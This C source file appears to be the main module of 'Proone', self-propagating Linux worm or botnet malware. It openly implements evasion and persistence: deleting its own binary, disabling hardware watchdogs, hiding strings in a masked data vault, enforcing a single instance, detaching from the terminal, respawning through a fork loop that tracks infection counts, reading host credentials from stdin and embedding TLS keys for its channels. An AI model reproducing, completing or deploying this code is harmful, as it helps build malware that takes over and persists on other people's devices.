#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/wait.h>

#include "proone.h"
#include "protocol.h"
#include "util_rt.h"
#include "dvault.h"
#include "llist.h"
// #include "htbt-worker.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"


struct prne_global prne_g;
struct prne_shared_global *prne_s_g = NULL;

sigset_t ss_exit, ss_all;

static prne_worker_t wkr_arr[2];
static size_t wkr_cnt = 0;

static void alloc_workers (void) {
	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		prne_init_worker(wkr_arr + i);
	}

	prne_g.resolv = prne_alloc_resolv(wkr_arr + 0, &prne_g.ssl.rnd);
	prne_assert(prne_g.resolv != NULL);
	wkr_cnt += 1;
}

static void free_workers (void) {
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_free_worker(wkr_arr + i);
	}
	prne_g.resolv = NULL;
}

static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
	if (mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, seed, slen) != 0) {
		mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, NULL, 0);
	}
}

/* proone_main()
* Actual main where all dangerous stuff happens.
* Most of long-lived variables are declared static so there's little stack
* allocation involvedsince stack allocation can cause page fault.
*/
static int proone_main (void) {
	static int caught_sig;
	static pid_t reaped;

	prne_assert(pth_init());
	prne_g.main_pth = pth_self();

#ifndef PRNE_DEBUG
	signal(SIGPIPE, SIG_IGN);
#endif
	seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
	alloc_workers();

	for (size_t i = 0; i < wkr_cnt; i += 1) {
		wkr_arr[i].pth = pth_spawn(PTH_ATTR_DEFAULT, wkr_arr[i].entry, wkr_arr[i].ctx);
		prne_assert(wkr_arr[i].pth != NULL);
	}

	do {
		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
		if (caught_sig == SIGCHLD) {
			do {
				reaped = waitpid(-1, NULL, WNOHANG);
			} while (reaped > 0);
			continue;
		}
	} while (false);
	sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);

	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_fin_worker(wkr_arr + i);
	}
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_assert(pth_join(wkr_arr[i].pth, NULL));
		prne_free_worker(wkr_arr + i);
	}

	free_workers();

	pth_kill();

	return 0;
}

static bool ensure_single_instance (void) {
	prne_g.lock_shm_fd = shm_open(
		prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
		O_RDWR | O_CREAT | O_CLOEXEC,
		0666);
	prne_dvault_reset_dict();
	if (prne_g.lock_shm_fd < 0) {
		return true;
	}

	if (flock(prne_g.lock_shm_fd, LOCK_EX | LOCK_NB) < 0) {
		prne_close(prne_g.lock_shm_fd);
		prne_g.lock_shm_fd = -1;

		return false;
	}

	return true;
}

static void delete_myself (const char *arg0) {
#ifndef PRNE_DEBUG
	static const char *proc_path = "/proc/self/exe";
	struct stat st;
	const char *path_to_unlink = NULL;
	char *path_buf = NULL;	  
	
	// get real path of myself
	if (lstat(proc_path, &st) == 0 && (path_buf = (char*)prne_malloc(1, st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size) == st.st_size) {
		path_buf[st.st_size] = 0;
		path_to_unlink = path_buf;
	}
	else {
		// try to delete arg0 instead
		path_to_unlink = arg0;
	}

	unlink(path_to_unlink);
	prne_free(path_buf);
#endif
}

static void disasble_watchdog (void) {
#ifndef PRNE_DEBUG
	static const char *watchdog_paths[] = {
		"/dev/watchdog",
		"/dev/misc/watchdog"
	};
	static const int one = 1;
	int fd;
	size_t i;

	for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
		if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
			ioctl(fd, 0x80045704, &one);
			prne_close(fd);
			break;
		}
	}
#endif
}

static void read_host_credential (void) {
	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3 + 2;
	char *buf = (char*)prne_malloc(1, buf_size);
	size_t len;

	if (buf == NULL) {
		return;
	}

	if (fgets(buf, buf_size, stdin) == NULL) {
		goto END;
	}
	len = prne_str_shift_spaces(buf, strlen(buf));

	if (len > 0) {
		prne_dec_base64_mem(buf, len, &prne_g.host_cred_data, &prne_g.host_cred_size);
	}

END:
	prne_free(buf);
}

static void setup_bin_archive (void) {
	// TODO
#if 0
	prne_stdin_base64_rf_ctx_t rf_ctx;

	prne_init_stdin_base64_rf_ctx(&rf_ctx);
	prne_g.bin_ready = prne_index_bin_archive(&rf_ctx, prne_stdin_base64_rf, &prne_g.bin_archive).rc == PRNE_PACK_RC_OK;
	prne_free_stdin_base64_rf_ctx(&rf_ctx);
#endif
}

static void set_env (void) {
	// environment set up function calls in here
}

static void load_ssl_conf (void) {
	// Could save 1108 bytes if bundled and compressed
	static const uint8_t CA_CRT[] = PRNE_X509_CA_CRT;
	static const uint8_t S_CRT[] = PRNE_X509_S_CRT;
	static const uint8_t S_KEY[] = PRNE_X509_S_KEY;
	static const uint8_t DH[] = PRNE_X509_DH;
	static const uint8_t C_CRT[] = PRNE_X509_C_CRT;
	static const uint8_t C_KEY[] = PRNE_X509_C_KEY;
	
	if (mbedtls_x509_crt_parse(&prne_g.ssl.ca, CA_CRT, sizeof(CA_CRT)) == 0) {
		prne_g.s_ssl.ready =
			mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
			mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, S_CRT, sizeof(S_CRT)) == 0 &&
			mbedtls_pk_parse_key(&prne_g.s_ssl.pk, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
			mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, DH, sizeof(DH)) == 0 &&
			mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
			mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
		if (prne_g.s_ssl.ready) {
			mbedtls_ssl_conf_ca_chain(&prne_g.s_ssl.conf, &prne_g.ssl.ca, NULL);
			// mutual auth
			mbedtls_ssl_conf_authmode(&prne_g.s_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
			// ignore expired cert (system wall clock might not be set)
			mbedtls_ssl_conf_verify(&prne_g.s_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
		}

		prne_g.c_ssl.ready =
			mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
			mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, C_CRT, sizeof(C_CRT)) == 0 &&
			mbedtls_pk_parse_key(&prne_g.c_ssl.pk, C_KEY, sizeof(C_KEY), NULL, 0) == 0 &&
			mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
		if (prne_g.c_ssl.ready) {
			mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ssl.ca, NULL);
			// mutual auth
			mbedtls_ssl_conf_authmode(&prne_g.c_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
			// ignore expired cert (system wall clock might not be set)
			mbedtls_ssl_conf_verify(&prne_g.c_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
		}
	}
}

static void init_shared_global (void) {
	// just die on error
	static const size_t str_len = 1 + 30;
	int fd;
	char name[str_len];

	/* TODO
	* 1. Try anonymous mmap()
	* 2. Try opening /dev/zero
	* 3. Try creating and opening /tmp/...
	* 4. Try creating and opening random file in current wd
	* 5. ... just don't use shared memory if all of these fail
	*/
	name[0] = '/';
	name[str_len] = 0;
	prne_rnd_anum_str(&prne_g.ssl.rnd, name + 1, str_len - 1);
	
	fd = shm_open(name, O_RDWR | O_CREAT | O_TRUNC, 0000);
	if (fd < 0) {
		abort();
	}
	shm_unlink(name);

	if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
		abort();
	}
	prne_s_g = (struct prne_shared_global*)mmap(NULL, sizeof(struct prne_shared_global), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (prne_s_g == NULL) {
		abort();
	}
	prne_close(fd);

	prne_s_g->bne_cnt = 0;
	prne_s_g->infect_cnt = 0;
	prne_s_g->ny_bin_name[0] = 0;
}

static void init_ids (void) {
	char line[37];
	int fd = -1;

	if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, prne_g.instance_id, sizeof(prne_g.instance_id)) != 0) {
		memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
	}

	memzero(prne_g.boot_id, 16);
	do { // fake loop
		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
		if (fd < 0) {
			break;
		}
		
		if (read(fd, line, 36) != 36) {
			break;
		}
		line[36] = 0;

		if (!prne_uuid_fromstr(line, prne_g.boot_id)) {
			break;
		}
	} while (false);
	prne_close(fd);
}

static void run_ny_bin (void) {
	// TODO
}


int main (const int argc, char **args) {
	static int exit_code = 0;
	static bool loop = true;

	sigemptyset(&ss_exit);
	sigemptyset(&ss_all);
	sigaddset(&ss_exit, SIGINT);
	sigaddset(&ss_exit, SIGTERM);
	sigaddset(&ss_all, SIGINT);
	sigaddset(&ss_all, SIGTERM);
	sigaddset(&ss_all, SIGCHLD);

	prne_g.host_cred_data = NULL;
	prne_g.host_cred_size = 0;
	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
	prne_g.run_cnt = 0;
	prne_g.resolv = NULL;
	prne_g.parent_pid = getpid();
	prne_g.child_pid = 0;
	prne_g.lock_shm_fd = -1;
	prne_g.bin_ready = false;
	prne_g.is_child = false;
	prne_init_bin_archive(&prne_g.bin_archive);
	mbedtls_x509_crt_init(&prne_g.ssl.ca);
	prne_mbedtls_entropy_init(&prne_g.ssl.entpy);
	mbedtls_ctr_drbg_init(&prne_g.ssl.rnd);
	mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
	mbedtls_pk_init(&prne_g.s_ssl.pk);
	mbedtls_dhm_init(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
	mbedtls_pk_init(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;

	// inits that need no outside resources
	prne_init_dvault();
	set_env();

	/* inits that need outside resources. IN THIS ORDER! */
	load_ssl_conf();
	seed_ssl_rnd(NULL, 0);
	init_ids();
	init_shared_global();
	delete_myself(args[0]);
	disasble_watchdog();

	if (!ensure_single_instance()) {
		prne_dbgpf("*** ensure_single_instance() returned false.");
		exit_code = 1;
		goto END;
	}

	setup_bin_archive();
	// load data from stdin
	read_host_credential();
	
	// done with the terminal
	prne_close(STDIN_FILENO);
	prne_close(STDOUT_FILENO);
#ifndef PRNE_DEBUG
	prne_close(STDERR_FILENO);
#endif

	sigprocmask(SIG_BLOCK, &ss_all, NULL);

	// main loop
	while (loop) {
		prne_g.child_pid = fork();

		if (prne_g.child_pid >= 0) {
			prne_g.run_cnt += 1;
		}

		if (prne_g.child_pid > 0) {
			static int status;
			static bool has_ny_bin;
			static int caught_signal = 0;

			status = 0; // FIXME: libc bug?

			do {
				prne_assert(sigwait(&ss_all, &caught_signal) == 0);

				switch (caught_signal) {
				case SIGINT:
				case SIGTERM:
					// pass the signal to the child
					loop = false;
					sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
					kill(prne_g.child_pid, caught_signal);
					continue;
				case SIGCHLD:
					prne_assert(waitpid(prne_g.child_pid, &status, WNOHANG) == prne_g.child_pid);
					break;
				}
			} while (false);

			has_ny_bin = strlen(prne_s_g->ny_bin_name) > 0;

			if (WIFEXITED(status)) {
				prne_dbgpf("* child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
				if (WEXITSTATUS(status) == 0) {
					if (has_ny_bin) {
						prne_dbgpf("* detected new bin. Attempting to exec()\n");
						run_ny_bin();
						// run_ny_bin() returns if fails
						prne_dbgperr("** run_ny_bin() failed");
					}
					break;
				}
			}
			else if (WIFSIGNALED(status)) {
				prne_dbgpf("** child process %d received signal %d!\n", prne_g.child_pid, WTERMSIG(status));
			}

			if (has_ny_bin) {
				shm_unlink(prne_s_g->ny_bin_name);
				memzero(prne_s_g->ny_bin_name, sizeof(prne_s_g->ny_bin_name));
			}

			sleep(1);
		}
		else {
			prne_close(prne_g.lock_shm_fd);
			prne_g.lock_shm_fd = -1;
			prne_g.is_child = true;
			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);
		
			exit_code = proone_main();
			break;
		}
	}
	prne_g.child_pid = 0;

END:
	prne_free_bin_archive(&prne_g.bin_archive);
	prne_g.bin_ready = false;
	
	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
	mbedtls_pk_free(&prne_g.s_ssl.pk);
	mbedtls_dhm_free(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
	mbedtls_pk_free(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;
	mbedtls_x509_crt_free(&prne_g.ssl.ca);
	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
	mbedtls_entropy_free(&prne_g.ssl.entpy);

	prne_free(prne_g.host_cred_data);
	prne_g.host_cred_data = NULL;
	prne_g.host_cred_size = 0;

	if (prne_g.lock_shm_fd >= 0) {
		shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
		prne_dvault_reset_dict();
		prne_close(prne_g.lock_shm_fd);
		prne_g.lock_shm_fd = -1;
	}

	prne_deinit_dvault();

	return exit_code;
}
